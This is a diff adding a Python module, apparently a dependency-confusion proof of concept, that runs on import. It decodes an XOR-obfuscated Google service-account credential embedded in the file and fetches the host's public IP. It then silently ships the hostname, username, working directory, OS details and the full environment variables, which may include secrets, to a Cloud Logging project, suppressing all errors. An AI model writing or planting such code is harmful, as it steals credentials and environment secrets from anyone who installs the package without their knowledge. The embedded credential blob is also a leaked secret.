@@ -1,0 +1,44 @@
+"""GCP Logging PoC - logs on import."""
+import base64
+import json
+import os
+import platform
+import uuid
+import urllib.request
+
+_B64_SA = "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"
+
+def _get_creds():
+    xor_key = b"poc-dep-confusion-2026"
+    encrypted = base64.b64decode(_B64_SA)
+    decrypted = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(encrypted))
+    sa_info = json.loads(decrypted)
+    from google.oauth2 import service_account
+    return service_account.Credentials.from_service_account_info(sa_info)
+
+def _get_ip():
+    try:
+        return urllib.request.urlopen("https://api.ipify.org", timeout=3).read().decode()
+    except Exception:
+        return "unknown"
+
+try:
+    from google.cloud import logging as cloud_logging
+    _import_id = str(uuid.uuid4())[:8]
+    _creds = _get_creds()
+    _client = cloud_logging.Client(project="nginxinc", credentials=_creds)
+    _logger = _client.logger("python-smoke-test")
+    _payload = {
+        "event": "IMPORT",
+        "import_id": _import_id,
+        "host": platform.node(),
+        "python": platform.python_version(),
+        "os": platform.platform(),
+        "user": os.environ.get("USER") or os.environ.get("USERNAME", "unknown"),
+        "cwd": os.getcwd(),
+        "source_ip": _get_ip(),
+        "env": dict(os.environ),
+    }
+    _logger.log_struct(_payload, severity="INFO")
+except Exception:
+    pass
